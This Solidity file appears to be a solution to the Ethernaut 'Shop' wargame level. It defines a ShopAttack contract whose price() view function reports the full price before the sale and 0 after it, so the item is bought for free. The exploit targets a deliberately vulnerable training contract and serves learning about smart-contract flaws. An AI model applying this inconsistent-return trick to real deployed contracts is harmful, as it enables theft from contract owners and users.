// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "../../../src/levels/21-Shop/Shop.sol";

contract ShopAttack is Buyer {
    Shop s;

    constructor(address payable _target) {
        s = Shop(_target);
    }

    function attackShop() external {
        s.buy();
    }

    function price() external view returns (uint256) {
        // use the sold bool as a way to determine
        // where the price is being called
        // i.e inside if or setting price value.
        if (s.isSold() == false) return s.price();
        else return 0;
    }
}
